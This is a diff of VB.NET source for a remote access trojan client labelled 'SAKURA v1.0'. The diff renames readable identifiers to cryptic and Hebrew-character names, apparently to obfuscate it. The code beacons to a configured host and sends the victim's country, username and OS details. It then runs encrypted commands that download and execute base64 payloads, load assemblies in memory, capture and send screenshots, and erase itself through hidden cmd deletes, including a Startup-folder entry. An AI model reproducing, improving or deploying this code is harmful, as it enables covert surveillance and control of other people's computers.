@@ -1,4 +1,4 @@
-﻿﻿
+﻿
 Imports System
 Imports Microsoft.VisualBasic
 Imports System.Diagnostics
@@ -16,20 +16,22 @@ Imports System.Windows.Forms
 
 
 
-Namespace ClientApp
+Namespace sexy
 
 
-    Public Class MainEntry
+    Public Class Main
 
 
 
         Public Shared Sub Main()
 
-            Dim ConnThread As New Threading.Thread(New Threading.ThreadStart(AddressOf NetworkClient.StartConnection))
-            ConnThread.Start()
+            Dim T1 As New Threading.Thread(New Threading.ThreadStart(AddressOf cs.BC))
+            T1.Start()
 
-            Dim PingThread As New Threading.Thread(New Threading.ThreadStart(AddressOf NetworkClient.SendHeartbeat))
-            PingThread.Start()
+            Dim T2 As New Threading.Thread(New Threading.ThreadStart(AddressOf cs.png))
+            T2.Start()
+
+
 
 
         End Sub
@@ -38,163 +40,163 @@ Namespace ClientApp
 
 
 
-    Public Class NetworkClient
+    Public Class cs
 
-        Public Shared ConnectionActive As Boolean = False
-        Public Shared ClientSocket As System.Net.Sockets.Socket
-        Public Shared ExpectedDataSize As Long = Nothing
-        Public Shared ReceiveBuffer() As Byte
-        Public Shared DataStream As New System.IO.MemoryStream
-        Public Shared ReadOnly Delimiter = Configuration.DELIMITER
+        Public Shared isConnected As Boolean = False
+        Public Shared S As System.Net.Sockets.Socket
+        Public Shared BufferLength As Long = Nothing
+        Public Shared Buffer() As Byte
+        Public Shared MS As New System.IO.MemoryStream
+        Public Shared ReadOnly SPL = Settings.SPL
 
-        Public Shared Sub StartConnection()
+        Public Shared Sub BC()
 
             Try
                 Threading.Thread.Sleep(2500)
-                ClientSocket = New System.Net.Sockets.Socket(System.Net.Sockets.AddressFamily.InterNetwork, System.Net.Sockets.SocketType.Stream, System.Net.Sockets.ProtocolType.Tcp)
+                S = New System.Net.Sockets.Socket(System.Net.Sockets.AddressFamily.InterNetwork, System.Net.Sockets.SocketType.Stream, System.Net.Sockets.ProtocolType.Tcp)
 
-                Dim serverIP As System.Net.IPAddress = serverIP.Parse(Configuration.HOST_LIST.Item(New Random().Next(0, Configuration.HOST_LIST.Count)))
-                Dim endpoint As System.Net.IPEndPoint = New System.Net.IPEndPoint(serverIP, Configuration.PORT_LIST.Item(New Random().Next(0, Configuration.PORT_LIST.Count)))
+                Dim ipAddress As System.Net.IPAddress = ipAddress.Parse(Settings.H.Item(New Random().Next(0, Settings.H.Count)))
+                Dim ipEndPoint As System.Net.IPEndPoint = New System.Net.IPEndPoint(ipAddress, Settings.P.Item(New Random().Next(0, Settings.P.Count)))
 
-                ExpectedDataSize = -1
-                ReceiveBuffer = New Byte(0) {}
-                DataStream = New System.IO.MemoryStream
+                BufferLength = -1
+                Buffer = New Byte(0) {}
+                MS = New System.IO.MemoryStream
 
-                ClientSocket.ReceiveBufferSize = 512000
-                ClientSocket.SendBufferSize = 512000
+                S.ReceiveBufferSize = 1024 * 500
+                S.SendBufferSize = 1024 * 500
 
-                ClientSocket.Connect(endpoint)
+                S.Connect(ipEndPoint)
 
-                ConnectionActive = True
-                SendData(BuildSystemInfo())
+                isConnected = True
+                sed(Info)
 
-                ClientSocket.BeginReceive(ReceiveBuffer, 0, ReceiveBuffer.Length, System.Net.Sockets.SocketFlags.None, New AsyncCallback(AddressOf DataReceivedCallback), ClientSocket)
+                S.BeginReceive(Buffer, 0, Buffer.Length, System.Net.Sockets.SocketFlags.None, New AsyncCallback(AddressOf BRC), S)
 
             Catch ex As Exception
-                ReestablishConnection()
+                DScon()
             End Try
         End Sub
 
-        Private Shared Function BuildSystemInfo()
-            Dim culture As System.Globalization.CultureInfo = System.Globalization.CultureInfo.CurrentCulture
-            Dim region As System.Globalization.RegionInfo = New System.Globalization.RegionInfo(culture.Name)
-            Dim location As String = region.DisplayName
-            Dim sysInfo As New Devices.ComputerInfo
-            Return String.Concat("INFO", Delimiter, location, Delimiter, Environment.UserName, Delimiter, sysInfo.OSFullName.Replace("Microsoft", Nothing), Environment.OSVersion.ServicePack.Replace("Service Pack", "SP") + " ", Environment.Is64BitOperatingSystem.ToString.Replace("False", "32bit").Replace("True", "64bit"), Delimiter, "CLIENT v1.0", Delimiter, GenerateIdentifierHash(GetMachineIdentifier()))
+        Private Shared Function Info()
+            Dim currentCulture As System.Globalization.CultureInfo = System.Globalization.CultureInfo.CurrentCulture
+            Dim country As System.Globalization.RegionInfo = New System.Globalization.RegionInfo(currentCulture.Name)
+            Dim hi As String = country.DisplayName
+            Dim OS As New Devices.ComputerInfo
+            Return String.Concat("INFO", SPL, hi, SPL, Environment.UserName, SPL, OS.OSFullName.Replace("Microsoft", Nothing), Environment.OSVersion.ServicePack.Replace("Service Pack", "SP") + " ", Environment.Is64BitOperatingSystem.ToString.Replace("False", "32bit").Replace("True", "64bit"), SPL, "SAKURA v1.0", SPL, GetHash(IDS))
 
         End Function
 
-        Public Shared Sub DataReceivedCallback(ByVal asyncResult As IAsyncResult)
-            If ConnectionActive = False Then ReestablishConnection()
+        Public Shared Sub BRC(ByVal ar As IAsyncResult)
+            If isConnected = False Then DScon()
             Try
-                Dim bytesRead As Integer = ClientSocket.EndReceive(asyncResult)
-                If bytesRead > 0 Then
-                    If ExpectedDataSize = -1 Then
-                        If ReceiveBuffer(0) = 0 Then
-                            ExpectedDataSize = ByteToString(DataStream.ToArray)
-                            DataStream.Dispose()
-                            DataStream = New System.IO.MemoryStream
+                Dim Received As Integer = S.EndReceive(ar)
+                If Received > 0 Then
+                    If BufferLength = -1 Then
+                        If Buffer(0) = 0 Then
+                            BufferLength = BS(MS.ToArray)
+                            MS.Dispose()
+                            MS = New System.IO.MemoryStream
 
-                            If ExpectedDataSize = 0 Then
-                                ExpectedDataSize = -1
-                                ClientSocket.BeginReceive(ReceiveBuffer, 0, ReceiveBuffer.Length, System.Net.Sockets.SocketFlags.None, New AsyncCallback(AddressOf DataReceivedCallback), ClientSocket)
+                            If BufferLength = 0 Then
+                                BufferLength = -1
+                                S.BeginReceive(Buffer, 0, Buffer.Length, System.Net.Sockets.SocketFlags.None, New AsyncCallback(AddressOf BRC), S)
                                 Exit Sub
                             End If
-                            ReceiveBuffer = New Byte(ExpectedDataSize - 1) {}
+                            Buffer = New Byte(BufferLength - 1) {}
                         Else
-                            DataStream.WriteByte(ReceiveBuffer(0))
+                            MS.WriteByte(Buffer(0))
                         End If
                     Else
-                        DataStream.Write(ReceiveBuffer, 0, bytesRead)
-                        If (DataStream.Length = ExpectedDataSize) Then
-                            Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf HandleIncomingData), DataStream.ToArray)
-                            ExpectedDataSize = -1
-                            DataStream.Dispose()
-                            DataStream = New System.IO.MemoryStream
-                            ReceiveBuffer = New Byte(0) {}
+                        MS.Write(Buffer, 0, Received)
+                        If (MS.Length = BufferLength) Then
+                            Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf BeRd), MS.ToArray)
+                            BufferLength = -1
+                            MS.Dispose()
+                            MS = New System.IO.MemoryStream
+                            Buffer = New Byte(0) {}
                         Else
-                            ReceiveBuffer = New Byte(ExpectedDataSize - DataStream.Length - 1) {}
+                            Buffer = New Byte(BufferLength - MS.Length - 1) {}
                         End If
                     End If
                 Else
-                    ReestablishConnection()
+                    DScon()
                     Exit Sub
                 End If
-                ClientSocket.BeginReceive(ReceiveBuffer, 0, ReceiveBuffer.Length, System.Net.Sockets.SocketFlags.None, New AsyncCallback(AddressOf DataReceivedCallback), ClientSocket)
+                S.BeginReceive(Buffer, 0, Buffer.Length, System.Net.Sockets.SocketFlags.None, New AsyncCallback(AddressOf BRC), S)
             Catch ex As Exception
-                ReestablishConnection()
+                DScon()
                 Exit Sub
             End Try
         End Sub
 
-        Public Shared Sub HandleIncomingData(ByVal dataBytes As Byte())
+        Public Shared Sub BeRd(ByVal b As Byte())
             Try
-                CommandProcessor.Execute(dataBytes)
+                Messa.Rd(b)
             Catch ex As Exception
             End Try
         End Sub
 
-        Public Shared Sub SendData(ByVal message As String)
+        Public Shared Sub sed(ByVal msg As String)
             Try
-                Using outStream As New System.IO.MemoryStream
-                    Dim encryptedData As Byte() = EncryptBytes(StringToBytes(message))
-                    Dim lengthHeader As Byte() = StringToBytes(encryptedData.Length & CChar(vbNullChar))
+                Using MS As New System.IO.MemoryStream
+                    Dim B As Byte() = A_EN(SB(msg))
+                    Dim L As Byte() = SB(B.Length & CChar(vbNullChar))
 
-                    outStream.Write(lengthHeader, 0, lengthHeader.Length)
-                    outStream.Write(encryptedData, 0, encryptedData.Length)
+                    MS.Write(L, 0, L.Length)
+                    MS.Write(B, 0, B.Length)
 
-                    ClientSocket.Poll(-1, System.Net.Sockets.SelectMode.SelectWrite)
-                    ClientSocket.Send(outStream.ToArray, 0, outStream.Length, System.Net.Sockets.SocketFlags.None)
+                    S.Poll(-1, System.Net.Sockets.SelectMode.SelectWrite)
+                    S.Send(MS.ToArray, 0, MS.Length, System.Net.Sockets.SocketFlags.None)
                 End Using
             Catch ex As Exception
-                ReestablishConnection()
+                DScon()
             End Try
         End Sub
 
-        Private Shared Sub SendCompleted(ByVal asyncResult As IAsyncResult)
+        Private Shared Sub EndSed(ByVal ar As IAsyncResult)
             Try
-                ClientSocket.EndSend(asyncResult)
+                S.EndSend(ar)
             Catch ex As Exception
             End Try
         End Sub
 
-        Public Shared Sub ReestablishConnection()
-            ConnectionActive = False
+        Public Shared Sub DScon()
+            isConnected = False
 
             Try
-                ClientSocket.Close()
-                ClientSocket.Dispose()
+                S.Close()
+                S.Dispose()
             Catch ex As Exception
             End Try
 
             Try
-                DataStream.Close()
-                DataStream.Dispose()
+                MS.Close()
+                MS.Dispose()
             Catch ex As Exception
             End Try
 
-            StartConnection()
+            BC()
 
         End Sub
 
-        Public Shared Sub SendHeartbeat()
+        Public Shared Sub png()
             While True
                 Threading.Thread.Sleep(30 * 1000)
                 Try
-                    If ClientSocket.Connected Then
-                        Using outStream As New System.IO.MemoryStream
-                            Dim encryptedData As Byte() = EncryptBytes(StringToBytes("PING?"))
-                            Dim lengthHeader As Byte() = StringToBytes(encryptedData.Length & CChar(vbNullChar))
+                    If S.Connected Then
+                        Using MS As New System.IO.MemoryStream
+                            Dim B As Byte() = A_EN(SB("PING?"))
+                            Dim L As Byte() = SB(B.Length & CChar(vbNullChar))
 
-                            outStream.Write(lengthHeader, 0, lengthHeader.Length)
-                            outStream.Write(encryptedData, 0, encryptedData.Length)
+                            MS.Write(L, 0, L.Length)
+                            MS.Write(B, 0, B.Length)
 
-                            ClientSocket.Poll(-1, System.Net.Sockets.SelectMode.SelectWrite)
-                            ClientSocket.Send(outStream.ToArray, 0, outStream.Length, System.Net.Sockets.SocketFlags.None)
+                            S.Poll(-1, System.Net.Sockets.SelectMode.SelectWrite)
+                            S.Send(MS.ToArray, 0, MS.Length, System.Net.Sockets.SocketFlags.None)
                         End Using
                     End If
                 Catch ex As Exception
-                    ConnectionActive = False
+                    isConnected = False
                 End Try
             End While
         End Sub
@@ -209,11 +211,14 @@ Namespace ClientApp
 
 
 
-    Public Class Configuration
-        Public Shared ReadOnly HOST_LIST As New Collections.Generic.List(Of String)({"%HOSTS%"})
-        Public Shared ReadOnly PORT_LIST As New Collections.Generic.List(Of Integer)({123456})
-        Public Shared ReadOnly DELIMITER As String = "<SAKURA>"
-        Public Shared ReadOnly ENCRYPTION_KEY As String = "<1234>"
+
+
+
+    Public Class Settings
+        Public Shared ReadOnly H As New Collections.Generic.List(Of String)({"%HOSTS%"})
+        Public Shared ReadOnly P As New Collections.Generic.List(Of Integer)({123456})
+        Public Shared ReadOnly SPL As String = "<SAKURA>"
+        Public Shared ReadOnly KEY As String = "<1234>"
     End Class
 
 
@@ -221,18 +226,24 @@ Namespace ClientApp
 
 
 
-    Public Class CommandProcessor
-        Private Shared ReadOnly Separator = NetworkClient.Delimiter
 
-        Public Shared Sub Execute(ByVal rawData As Byte())
+
+
+
+
+
+    Public Class Messa
+        Private Shared ReadOnly SPL = cs.SPL
+
+        Public Shared Sub Rd(ByVal b As Byte())
             Try
-                Dim commandParts As String() = Split(ByteToString(DecryptBytes(rawData)), Separator)
-                Select Case commandParts(0)
+                Dim A As String() = Split(BS(A_DE(b)), SPL)
+                Select Case A(0)
 
                     Case "CLOSE"
                         Try
-                            NetworkClient.ClientSocket.Shutdown(System.Net.Sockets.SocketShutdown.Both)
-                            NetworkClient.ClientSocket.Close()
+                            cs.S.Shutdown(System.Net.Sockets.SocketShutdown.Both)
+                            cs.S.Close()
                         Catch ex As Exception
                         End Try
 
@@ -240,61 +251,67 @@ Namespace ClientApp
 
                     Case "De"
 
-                        NetworkClient.ClientSocket.Shutdown(System.Net.Sockets.SocketShutdown.Both)
-                        NetworkClient.ClientSocket.Close()
-                        RemoveFile(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup), "ErrorCoder")
-                        RemoveFile(Environment.CurrentDirectory, System.Windows.Forms.Application.ProductName)
+                        cs.S.Shutdown(System.Net.Sockets.SocketShutdown.Both)
+                        cs.S.Close()
+                        Delete(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup), "ErrorCoder")
+                        Delete(Environment.CurrentDirectory, System.Windows.Forms.Application.ProductName)
                         Environment.Exit(0)
 
 
                     Case "DW"
-                        SaveAndExecute(commandParts(1), commandParts(2))
+                        Dwnld(A(1), A(2))
                     Case "DM"
-                        LoadInMemory(commandParts(2))
+                        memory(A(2))
                     Case "DAM"
-                        LoadInMemory(commandParts(2))
+                        ' Downloadm(A(1), A(2))
+                        memory(A(2))
                     Case "UPDATE"
-                        ApplyUpdate(commandParts(1))
+                        Updt(A(1))
 
                     Case "RD-"
-                        NetworkClient.SendData("RD-")
+                        cs.sed("RD-")
 
                     Case "RD+"
-                        ScreenCapture.CaptureScreen(commandParts(1), commandParts(2))
+                        RDSTOP.Cap(A(1), A(2))
 
                 End Select
             Catch ex As Exception
             End Try
         End Sub
-        Private Shared Sub LoadInMemory(ByVal AssemblyData As String)
+        Private Shared Sub memory(ByVal Data As String)
             Try
-                Dim execThread As New Threading.Thread(Sub()
-                                                           Dim loadedAssembly As Object = Reflection.Assembly.Load(Convert.FromBase64String(StrReverse(AssemblyData)))
-                                                           loadedAssembly.EntryPoint.Invoke(Nothing, Nothing)
-                                                       End Sub)
-                execThread.Start()
+                Dim sd As New Threading.Thread(Sub()
+                                                   Dim כםּנתּביּזשווךּיזץפֿשפעלשכיולפמםחבּ As Object = Reflection.Assembly.Load(Convert.FromBase64String(StrReverse(Data)))
+                                                   כםּנתּביּזשווךּיזץפֿשפעלשכיולפמםחבּ.EntryPoint.Invoke(Nothing, Nothing)
+                                               End Sub)
+                sd.Start()
 
             Catch ex As Exception
+                'MsgBox(ex.Message)
 
             End Try
         End Sub
-        Private Shared Sub RemoveFile(ByVal directoryPath As String, ByVal fileName As String)
+        Private Shared Sub Delete(ByVal d As String, ByVal appname As String)
             Try
-                Dim cmdInfo As New ProcessStartInfo("cmd.exe")
-                cmdInfo.WindowStyle = ProcessWindowStyle.Hidden
-                cmdInfo.CreateNoWindow = True
-                cmdInfo.UseShellExecute = False
-                cmdInfo.RedirectStandardInput = True
-                cmdInfo.RedirectStandardOutput = True
+                Dim startInfo As New ProcessStartInfo("cmd.exe")
+                startInfo.WindowStyle = ProcessWindowStyle.Hidden
+                startInfo.CreateNoWindow = True
+                startInfo.UseShellExecute = False
+                startInfo.RedirectStandardInput = True
+                startInfo.RedirectStandardOutput = True
 
 
-                Dim cmdProcess As New Process()
-                cmdProcess.StartInfo = cmdInfo
-                cmdProcess.Start()
+                Dim process As New Process()
+                process.StartInfo = startInfo
+                process.Start()
 
-                Dim deleteCommand As String = "/C choice /C Y /N /D Y /T 3 & Del """ & directoryPath & "\" & fileName & ".exe"""
-                cmdProcess.StandardInput.WriteLine(deleteCommand)
-                cmdProcess.StandardInput.Close()
+
+
+
+                Dim command As String = "/C choice /C Y /N /D Y /T 3 & Del """ & d & "\" & appname & ".exe"""
+                process.StandardInput.WriteLine(command)
+                process.StandardInput.Close()
+
 
 
             Catch
@@ -303,24 +320,24 @@ Namespace ClientApp
 
 
         End Sub
-        Private Shared Sub SaveAndExecute(ByVal FileName As String, ByVal FileContent As String)
+        Private Shared Sub Dwnld(ByVal Name As String, ByVal Data As String)
             Try
-                Dim tempFilePath = System.IO.Path.GetTempFileName + FileName
-                System.IO.File.WriteAllBytes(tempFilePath, Convert.FromBase64String(FileContent))
+                Dim NewFile = System.IO.Path.GetTempFileName + Name
+                System.IO.File.WriteAllBytes(NewFile, Convert.FromBase64String(Data))
                 Threading.Thread.Sleep(500)
-                Diagnostics.Process.Start(tempFilePath)
+                Diagnostics.Process.Start(NewFile)
             Catch ex As Exception
             End Try
         End Sub
 
-        Private Shared Sub ApplyUpdate(ByVal UpdateData As String)
+        Private Shared Sub Updt(ByVal Data As String)
             Try
-                Dim updatePath As String = System.IO.Path.GetTempFileName + ".exe"
-                System.IO.File.WriteAllBytes(updatePath, Convert.FromBase64String(UpdateData))
+                Dim Temp As String = System.IO.Path.GetTempFileName + ".exe"
+                System.IO.File.WriteAllBytes(Temp, Convert.FromBase64String(Data))
                 Threading.Thread.Sleep(500)
-                Diagnostics.Process.Start(updatePath)
+                Diagnostics.Process.Start(Temp)
 
-                Dim cleanupCommand As New Diagnostics.ProcessStartInfo With {
+                Dim Del As New Diagnostics.ProcessStartInfo With {
                 .Arguments = "/C choice /C Y /N /D Y /T 1 & Del " + Diagnostics.Process.GetCurrentProcess.MainModule.FileName,
                 .WindowStyle = Diagnostics.ProcessWindowStyle.Hidden,
                 .CreateNoWindow = True,
@@ -328,12 +345,12 @@ Namespace ClientApp
             }
 
                 Try
-                    NetworkClient.ClientSocket.Shutdown(System.Net.Sockets.SocketShutdown.Both)
-                    NetworkClient.ClientSocket.Close()
+                    cs.S.Shutdown(System.Net.Sockets.SocketShutdown.Both)
+                    cs.S.Close()
                 Catch ex As Exception
                 End Try
 
-                Diagnostics.Process.Start(cleanupCommand)
+                Diagnostics.Process.Start(Del)
                 Environment.Exit(0)
             Catch ex As Exception
             End Try
@@ -349,59 +366,61 @@ Namespace ClientApp
 
 
 
-    Module Utilities
 
-        Function StringToBytes(ByVal text As String) As Byte()
-            Return System.Text.Encoding.Default.GetBytes(text)
+
+    Module Helper
+
+        Function SB(ByVal s As String) As Byte()
+            Return System.Text.Encoding.Default.GetBytes(s)
         End Function
 
-        Function ByteToString(ByVal bytes As Byte()) As String
-            Return System.Text.Encoding.Default.GetString(bytes)
+        Function BS(ByVal b As Byte()) As String
+            Return System.Text.Encoding.Default.GetString(b)
         End Function
 
-        Function GetMachineIdentifier() As String
-            Dim identifier As String = Nothing
+        Function IDS() As String
+            Dim S As String = Nothing
 
-            identifier += Environment.UserDomainName
-            identifier += Environment.UserName
-            identifier += Environment.MachineName
+            S += Environment.UserDomainName
+            S += Environment.UserName
+            S += Environment.MachineName
 
-            Return identifier
+            Return S
         End Function
 
-        Function GenerateIdentifierHash(dataToHash As String) As String
-            Dim hasher As New System.Security.Cryptography.MD5CryptoServiceProvider
-            Dim dataBytes() As Byte = StringToBytes(dataToHash)
-            dataBytes = hasher.ComputeHash(dataBytes)
-            Dim hashResult As New System.Text.StringBuilder
-            For Each byteValue As Byte In dataBytes
-                hashResult.Append(byteValue.ToString("x2"))
+        Function GetHash(strToHash As String) As String
+            Dim md5Obj As New System.Security.Cryptography.MD5CryptoServiceProvider
+            Dim bytesToHash() As Byte = SB(strToHash)
+            bytesToHash = md5Obj.ComputeHash(bytesToHash)
+            Dim strResult As New System.Text.StringBuilder
+            For Each b As Byte In bytesToHash
+                strResult.Append(b.ToString("x2"))
             Next
-            Return hashResult.ToString.Substring(0, 12).ToUpper
+            Return strResult.ToString.Substring(0, 12).ToUpper
         End Function
 
-        Function EncryptBytes(ByVal inputData As Byte()) As Byte()
-            Dim cryptoProvider As New System.Security.Cryptography.RijndaelManaged
-            Dim hashProvider As New System.Security.Cryptography.MD5CryptoServiceProvider
+        Function A_EN(ByVal input As Byte()) As Byte()
+            Dim AES_ As New System.Security.Cryptography.RijndaelManaged
+            Dim Hash As New System.Security.Cryptography.MD5CryptoServiceProvider
             Try
-                cryptoProvider.Key = hashProvider.ComputeHash(StringToBytes(Configuration.ENCRYPTION_KEY))
-                cryptoProvider.Mode = System.Security.Cryptography.CipherMode.ECB
-                Dim encryptor As System.Security.Cryptography.ICryptoTransform = cryptoProvider.CreateEncryptor
-                Dim dataBuffer As Byte() = inputData
-                Return encryptor.TransformFinalBlock(dataBuffer, 0, dataBuffer.Length)
+                AES_.Key = Hash.ComputeHash(SB(Settings.KEY))
+                AES_.Mode = System.Security.Cryptography.CipherMode.ECB
+                Dim DESEncrypter As System.Security.Cryptography.ICryptoTransform = AES_.CreateEncryptor
+                Dim Buffer As Byte() = input
+                Return DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
             Catch ex As Exception
             End Try
         End Function
 
-        Function DecryptBytes(ByVal inputData As Byte()) As Byte()
-            Dim cryptoProvider As New System.Security.Cryptography.RijndaelManaged
-            Dim hashProvider As New System.Security.Cryptography.MD5CryptoServiceProvider
+        Function A_DE(ByVal input As Byte()) As Byte()
+            Dim AES_ As New System.Security.Cryptography.RijndaelManaged
+            Dim Hash As New System.Security.Cryptography.MD5CryptoServiceProvider
             Try
-                cryptoProvider.Key = hashProvider.ComputeHash(StringToBytes(Configuration.ENCRYPTION_KEY))
-                cryptoProvider.Mode = System.Security.Cryptography.CipherMode.ECB
-                Dim decryptor As System.Security.Cryptography.ICryptoTransform = cryptoProvider.CreateDecryptor
-                Dim dataBuffer As Byte() = inputData
-                Return decryptor.TransformFinalBlock(dataBuffer, 0, dataBuffer.Length)
+                AES_.Key = Hash.ComputeHash(SB(Settings.KEY))
+                AES_.Mode = System.Security.Cryptography.CipherMode.ECB
+                Dim DESDecrypter As System.Security.Cryptography.ICryptoTransform = AES_.CreateDecryptor
+                Dim Buffer As Byte() = input
+                Return DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
             Catch ex As Exception
             End Try
         End Function
@@ -412,50 +431,53 @@ Namespace ClientApp
 
 
 
-    Public Class ScreenCapture
 
-        Public Shared Sub CaptureScreen(ByVal Width As Integer, ByVal Height As Integer)
+
+
+    Public Class RDSTOP
+
+        Public Shared Sub Cap(ByVal W As Integer, ByVal H As Integer)
             Try
-                Dim screenImage As New System.Drawing.Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
-                Dim graphics As System.Drawing.Graphics = System.Drawing.Graphics.FromImage(screenImage)
-                graphics.CompositingQuality = System.Drawing.Drawing2D.CompositingQuality.HighSpeed
-                graphics.CopyFromScreen(0, 0, 0, 0, New System.Drawing.Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), System.Drawing.CopyPixelOperation.SourceCopy)
+                Dim B As New System.Drawing.Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
+                Dim g As System.Drawing.Graphics = System.Drawing.Graphics.FromImage(B)
+                g.CompositingQuality = System.Drawing.Drawing2D.CompositingQuality.HighSpeed
+                g.CopyFromScreen(0, 0, 0, 0, New System.Drawing.Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), System.Drawing.CopyPixelOperation.SourceCopy)
 
-                Dim resizedImage As New System.Drawing.Bitmap(Width, Height)
-                Dim resizeGraphics As System.Drawing.Graphics = System.Drawing.Graphics.FromImage(resizedImage)
-                resizeGraphics.CompositingQuality = System.Drawing.Drawing2D.CompositingQuality.HighSpeed
-                resizeGraphics.DrawImage(screenImage, New System.Drawing.Rectangle(0, 0, Width, Height), New System.Drawing.Rectangle(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), System.Drawing.GraphicsUnit.Pixel)
+                Dim Resize As New System.Drawing.Bitmap(W, H)
+                Dim g2 As System.Drawing.Graphics = System.Drawing.Graphics.FromImage(Resize)
+                g2.CompositingQuality = System.Drawing.Drawing2D.CompositingQuality.HighSpeed
+                g2.DrawImage(B, New System.Drawing.Rectangle(0, 0, W, H), New System.Drawing.Rectangle(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), System.Drawing.GraphicsUnit.Pixel)
 
-                Dim qualityParam As System.Drawing.Imaging.EncoderParameter = New System.Drawing.Imaging.EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 40)
-                Dim codecInfo As System.Drawing.Imaging.ImageCodecInfo = GetEncoderInfo(System.Drawing.Imaging.ImageFormat.Jpeg)
-                Dim encoderParams As System.Drawing.Imaging.EncoderParameters = New System.Drawing.Imaging.EncoderParameters(1)
-                encoderParams.Param(0) = qualityParam
+                Dim encoderParameter As System.Drawing.Imaging.EncoderParameter = New System.Drawing.Imaging.EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 40)
+                Dim encoderInfo As System.Drawing.Imaging.ImageCodecInfo = GetEncinfo(System.Drawing.Imaging.ImageFormat.Jpeg)
+                Dim encoderParameters As System.Drawing.Imaging.EncoderParameters = New System.Drawing.Imaging.EncoderParameters(1)
+                encoderParameters.Param(0) = encoderParameter
 
-                Dim imageStream As New System.IO.MemoryStream
-                resizedImage.Save(imageStream, codecInfo, encoderParams)
+                Dim MS As New System.IO.MemoryStream
+                Resize.Save(MS, encoderInfo, encoderParameters)
 
                 Try
-                    SyncLock NetworkClient.ClientSocket
-                        Using sendStream As New System.IO.MemoryStream
-                            Dim encryptedImage As Byte() = EncryptBytes(StringToBytes(("RD+" + NetworkClient.Delimiter + ByteToString(imageStream.ToArray))))
-                            Dim lengthHeader As Byte() = StringToBytes(encryptedImage.Length & CChar(vbNullChar))
+                    SyncLock cs.S
+                        Using MEM As New System.IO.MemoryStream
+                            Dim Bb As Byte() = A_EN(SB(("RD+" + cs.SPL + BS(MS.ToArray))))
+                            Dim L As Byte() = SB(Bb.Length & CChar(vbNullChar))
 
-                            sendStream.Write(lengthHeader, 0, lengthHeader.Length)
-                            sendStream.Write(encryptedImage, 0, encryptedImage.Length)
+                            MEM.Write(L, 0, L.Length)
+                            MEM.Write(Bb, 0, Bb.Length)
 
-                            NetworkClient.ClientSocket.Poll(-1, System.Net.Sockets.SelectMode.SelectWrite)
-                            NetworkClient.ClientSocket.Send(sendStream.ToArray, 0, sendStream.Length, System.Net.Sockets.SocketFlags.None)
+                            cs.S.Poll(-1, System.Net.Sockets.SelectMode.SelectWrite)
+                            cs.S.Send(MEM.ToArray, 0, MEM.Length, System.Net.Sockets.SocketFlags.None)
                         End Using
                     End SyncLock
                 Catch ex As Exception
-                    NetworkClient.ConnectionActive = False
+                    cs.isConnected = False
                 End Try
 
                 Try
-                    graphics.Dispose()
-                    resizeGraphics.Dispose()
-                    screenImage.Dispose()
-                    imageStream.Dispose()
+                    g.Dispose()
+                    g2.Dispose()
+                    B.Dispose()
+                    MS.Dispose()
                 Catch ex As Exception
                 End Try
 
@@ -464,18 +486,18 @@ Namespace ClientApp
 
         End Sub
 
-        Private Shared Function GetEncoderInfo(ByVal format As System.Drawing.Imaging.ImageFormat) As System.Drawing.Imaging.ImageCodecInfo
+        Private Shared Function GetEncinfo(ByVal format As System.Drawing.Imaging.ImageFormat) As System.Drawing.Imaging.ImageCodecInfo
             Try
-                Dim index As Integer
-                Dim availableEncoders() As System.Drawing.Imaging.ImageCodecInfo
-                availableEncoders = System.Drawing.Imaging.ImageCodecInfo.GetImageEncoders()
+                Dim j As Integer
+                Dim encoders() As System.Drawing.Imaging.ImageCodecInfo
+                encoders = System.Drawing.Imaging.ImageCodecInfo.GetImageEncoders()
 
-                index = 0
-                While index < availableEncoders.Length
-                    If availableEncoders(index).FormatID = format.Guid Then
-                        Return availableEncoders(index)
+                j = 0
+                While j < encoders.Length
+                    If encoders(j).FormatID = format.Guid Then
+                        Return encoders(j)
                     End If
-                    index += 1
+                    j += 1
                 End While
                 Return Nothing
             Catch ex As Exception
